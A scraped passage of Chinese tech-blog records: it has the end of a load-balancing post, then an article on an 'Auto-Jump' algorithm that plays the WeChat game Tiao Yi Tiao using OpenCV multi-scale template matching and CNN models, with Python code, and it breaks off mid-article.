target=\"_blank\">这篇文章</a>中提到，负载均衡是一种推模型，一定会选出一个服务节点，然后把请求推送过来。而换一种思路，使用消息队列，就变成了拉模型：空闲的服务节点主动去拉取请求进行处理，各个节点的负载自然也是均衡的。消息队列相比负载均衡好处在于，服务节点不会被大量请求冲垮，同时增加服务节点更加容易；缺点也很明显，请求不是事实处理的。</p>\n<p>想到另外一个例子，比如在gunicorn这种pre-fork模型中，master（gunicorn 中Arbiter）会fork出指定数量的worker进程，worker进程在同样的端口上监听，谁先监听到网络连接请求，谁就提供服务，这也是worker进程之间的负载均衡。</p>\n<h1>references</h1>\n<p><a href=\"https://en.wikipedia.org/wiki/Load_balancing_(computing)\" target=\"_blank\">wiki：Load balancing</a></p>\n<p><a href=\"http://zhuanlan.51cto.com/art/201609/517313.htm\" target=\"_blank\">一分钟了解负载均衡的一切</a></p>\n<p><a href=\"https://github.com/grpc/grpc/blob/master/doc/load-balancing.md\" target=\"_blank\">grpc load-balancing.md</a></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113417\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113417votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113417\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 3 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "IT技术", "front_image_url": ["http://wx1.sinaimg.cn/mw690/63918611gy1fnig1hdnpdj20gx0c2wez.jpg"], "title": "AI 玩跳一跳的正确姿势，跳一跳 Auto-Jump 算法详解", "fav_nums": 4, "url": "http://blog.jobbole.com/113493/", "create_date": "2018/01/16", "url_object_id": "9f93ee8d23796b520f6499f5d14f230d", "comment_nums": 12, "front_image_path": "full/d1a65618926b13451ddf200c0f8441e20f466de3.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://zhuanlan.zhihu.com/p/32636329\">肖泰洪 + 安捷</a>   </div><p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/63918611gy1fnig1hdnpdj20gx0c2wez.jpg\" width=\"609\" height=\"434\"></p>\n<p>最近，微信小游戏跳一跳可以说是火遍了全国，从小孩子到大孩子仿佛每一个人都在刷跳一跳，作为无（zhi）所（hui）不（ban）能（zhuan）的AI程序员，我们在想，能不能用人工智能（AI）和计算机视觉（CV）的方法来玩一玩这个游戏？于是，我们开发了微信跳一跳Auto-Jump算法，重新定义了玩跳一跳的正确姿势，我们的算法不仅远远超越了人类的水平，在速度和准确度上也远远超越了目前已知的所有算法，可以说是跳一跳界的state-of-the-art，下面我们详细介绍我们的算法。</p>\n<p>算法的第一步是获取手机屏幕的截图并可以控制手机的触控操作，我们的<a href=\"https://github.com/Prinsphield/Wechat_AutoJump\">github仓库</a>里详细介绍了针对Android和IOS手机的配置方法。</p>\n<p>你只需要按照将手机连接电脑，按照教程执行就可以完成配置。在获取到屏幕截图之后，就是个简单的视觉问题。我们需要找的就是小人的位置和下一次需要跳的台面的中心。</p>\n<p>如图所示，绿色的点代表小人当前的位置，红点代表目标位置。</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/63918611gy1fnig1hqbj2j20k00hoglp.jpg\" width=\"690\" height=\"610\"></p>\n<h2>多尺度搜索（Multiscale Search）</h2>\n<p>这个问题可以有非常多的方法去解，为了糙快猛地刷上榜，我一开始用的方式是多尺度搜索。我随便找了一张图，把小人抠出来，就像下面这样。</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/63918611gy1fnig1j5ysoj201e03wdfl.jpg\" width=\"50\" height=\"140\"></p>\n<p>另外，我注意到小人在屏幕的不同位置，大小略有不同，所以我设计了多尺度的搜索，用不同大小的进行匹配，最后选取置信度（confidence score）最高的。</p>\n<p>多尺度搜索的代码长这样</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29800612e762964228\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef multi_scale_search(pivot, screen, range=0.3, num=10):\r\n    H, W = screen.shape[:2]\r\n    h, w = pivot.shape[:2]\r\n\r\n    found = None\r\n    for scale in np.linspace(1-range, 1+range, num)[::-1]:\r\n        resized = cv2.resize(screen, (int(W * scale), int(H * scale)))\r\n        r = W / float(resized.shape[1])\r\n        if resized.shape[0] &lt; h or resized.shape[1] &lt; w:\r\n            break\r\n        res = cv2.matchTemplate(resized, pivot, cv2.TM_CCOEFF_NORMED)\r\n\r\n        loc = np.where(res &gt;= res.max())\r\n        pos_h, pos_w = list(zip(*loc))[0]\r\n\r\n        if found is None or res.max() &gt; found[-1]:\r\n            found = (pos_h, pos_w, r, res.max())\r\n\r\n    if found is None: return (0,0,0,0,0)\r\n    pos_h, pos_w, r, score = found\r\n    start_h, start_w = int(pos_h * r), int(pos_w * r)\r\n    end_h, end_w = int((pos_h + h) * r), int((pos_w + w) * r)\r\n    return [start_h, start_w, end_h, end_w, score]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29800612e762964228-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29800612e762964228-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29800612e762964228-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29800612e762964228-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29800612e762964228-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29800612e762964228-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29800612e762964228-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29800612e762964228-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29800612e762964228-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29800612e762964228-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29800612e762964228-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29800612e762964228-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29800612e762964228-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29800612e762964228-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29800612e762964228-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29800612e762964228-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29800612e762964228-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29800612e762964228-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29800612e762964228-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29800612e762964228-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29800612e762964228-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29800612e762964228-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29800612e762964228-23\">23</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29800612e762964228-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">multi_scale_search</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pivot</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">screen</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">range</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0.3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">num</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29800612e762964228-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">H</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">W</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">screen</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">shape</span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29800612e762964228-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">h</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">w</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pivot</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">shape</span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29800612e762964228-4\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f29800612e762964228-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">found</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">None</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29800612e762964228-6\"><span class=\"crayon-e\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">scale </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">np</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">linspace</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">range</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">range</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">num</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">::</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29800612e762964228-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">resized</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cv2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">resize</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">screen</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e \">W *</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">scale</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e \">H *</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">scale</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29800612e762964228-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">r</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">W</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">float</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">resized</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">shape</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29800612e762964228-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">resized</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">shape</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">h</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">resized</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">shape</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">w</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29800612e762964228-10\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">break</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29800612e762964228-11\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">res</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cv2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">matchTemplate</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">resized</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pivot</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cv2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">TM_CCOEFF_NORMED</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29800612e762964228-12\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f29800612e762964228-13\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">loc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">np</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">where</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">res</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">res</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">max</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29800612e762964228-14\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">pos_h</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pos_w</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">list</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">zip</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">loc</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29800612e762964228-15\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29800612e762964228-16\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">found </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">None </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">res</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">max</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">found</span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29800612e762964228-17\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">found</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pos_h</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pos_w</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">res</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">max</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29800612e762964228-18\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f29800612e762964228-19\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">found </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">None</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29800612e762964228-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">pos_h</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pos_w</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">score</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">found</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29800612e762964228-21\"><span class=\"crayon-e\">    </span><span class=\"crayon-v\">start_h</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">start_w</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e \">pos_h *</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e \">pos_w *</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29800612e762964228-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">end_h</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">end_w</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pos_h</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">h</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pos_w</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">w</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29800612e762964228-23\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">start_h</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">start_w</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">end_h</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">end_w</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">score</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0073 seconds] -->\r\n<p>我们来试一试，效果还不错，应该说是又快又好，我所有的实验中找小人从来没有失误。</p>\n<p>不过这里的位置框的底部中心并不是小人的位置，真实的位置是在那之上一些。</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/63918611gy1fnig1jnfs0j20k00zkq33.jpg\" width=\"690\" height=\"1227\"></p>\n<p>同理，目标台面也可以用这种办法搜索，但是我们需要收集一些不同的台面，有圆形的，方形的，便利店，井盖，棱柱等等。由于数量一多，加上多尺度的原因，速度上会慢下来。这时候，我们就需要想办法加速了。首先可以注意到目标位置始终在小人的位置的上面，所以可以操作的一点就是在找到小人位置之后把小人位置以下的部分都舍弃掉，这样可以减少搜索空间。但是这还是不够，我们需要进一步去挖掘游戏里的故事。小人和目标台面基本上是关于屏幕中心对称的位置的。这提供了一个非常好的思路去缩小搜索空间。假设屏幕分辨率是（1280，720）的，小人底部的位置是（h1, w1),那么关于中心对称点的位置就是（1280 – h1， 720 – w1），以这个点为中心的一个边长300的正方形内，我们再去多尺度搜索目标位置，就会又快有准了。效果见下图，蓝色框是（300，300）的搜索区域，红色框是搜到的台面，矩形中心就是目标点的坐标了。</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/63918611gy1fnig1k9kyxj20k00zkq36.jpg\" width=\"690\" height=\"1227\"></p>\n<h2>加速的奇技淫巧（Fast-Search）</h2>\n<p>玩游戏需要细心观察。我们可以发现，小人上一次如果跳到台面中心，那么下一次目标台面的中心会有一个白点，就像刚才所展示的图里的。更加细心的人会发现，白点的RGB值是（245，245，245），这就让我找到了一个非常简单并且高效的方式，就是直接去搜索这个白点，注意到白点是一个连通区域，像素值为（245，245，245）的像素个数稳定在280-310之间，所以我们可以利用这个去直接找到目标的位置。这种方式只在前一次跳到中心的时候可以用，不过没有关系，我们每次都可以试一试这个不花时间的方法，不行再考虑多尺度搜索。</p>\n<p>讲到这里，我们的方法已经可以运行的非常出色了，基本上是一个永动机。下面是用我的手机玩了一个半小时左右，跳了859次的状态，我们的方法正确的计算出来了小人的位置和目标位置，不过我选择狗带了，因为手机卡的已经不行了。</p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/63918611gy1fnig1kwberj20k00bzt8u.jpg\" width=\"690\" height=\"413\"></p>\n<p>这里有一个示例视频，欢迎观看!</p>\n<p><a href=\"https://v.vzuu.com/video/932359600779309056\" target=\"_blank\">点击查看视频</a></p>\n<p><b>到这里就结束了吗？那我们和业余玩家有什么区别？下面进入正经的学术时间，非战斗人员请迅速撤离！</b></p>\n<h2>CNN Coarse-to-Fine 模型</h2>\n<p>考虑到IOS设备由于屏幕抓取方案的限制（WebDriverAgent获得的截图经过了压缩，图像像素受损，不再是原来的像素值，原因不详，欢迎了解详情的小伙伴提出改进意见~）无法使用fast-search，同时为了兼容多分辨率设备，我们使用卷积神经网络构建了一个更快更鲁棒的目标检测模型，下面分数据采集与预处理，coarse模型，fine模型，cascade四部分介绍我们的算法。</p>\n<h2>数据采集与预处理</h2>\n<p>基于我们非常准确的multiscale-search、fast-search模型，我们采集了7次实验数据，共计大约3000张屏幕截图，每一张截图均带有目标位置标注，对于每一张图，我们进行了两种不同的预处理方式，并分别用于训练coarse模型和fine模型，下面分别介绍两种不同的预处理方式。</p>\n<h2>Coarse 模型数据预处理</h2>\n<p>由于每一张图像中真正对于当前判断有意义的区域只在屏幕中央位置，即人和目标物体所在的位置，因此，每一张截图的上下两部分都是没有意义的，因此，我们将采集到的大小为1280*720的图像沿x方向上下各截去320*720大小，只保留中心640*720的图像作为训练数据。</p>\n<p>我们观察到，游戏中，每一次当小人落在目标物中心位置时，下一个目标物的中心会出现一个白色的圆点，</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/63918611gy1fnig1m4jdtj20k00zk74f.jpg\" width=\"690\" height=\"1227\"></p>\n<p>考虑到训练数据中fast-search会产生大量有白点的数据，为了杜绝白色圆点对网络训练的干扰，我们对每一张图进行了去白点操作，具体做法是，用白点周围的纯色像素填充白点区域。</p>\n<h2>Fine 模型数据预处理</h2>\n<p>为了进一步提升模型的精度，我们为fine模型建立了数据集，对训练集中的每一张图，在目标点附近截取320*320大小的一块作为训练数据，</p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/63918611gy1fnig1mrlqyj208w08wdfo.jpg\" width=\"320\" height=\"320\"></p>\n<p>为了防止网络学到trivial的结果，我们对每一张图增加了50像素的随机偏移。fine模型数据同样进行了去白点操作。</p>\n<h2>Coarse 模型</h2>\n<p>我们把这一问题看成了回归问题，coarse模型使用一个卷积神经网络回归目标的位置，</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29800613d279620228\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px 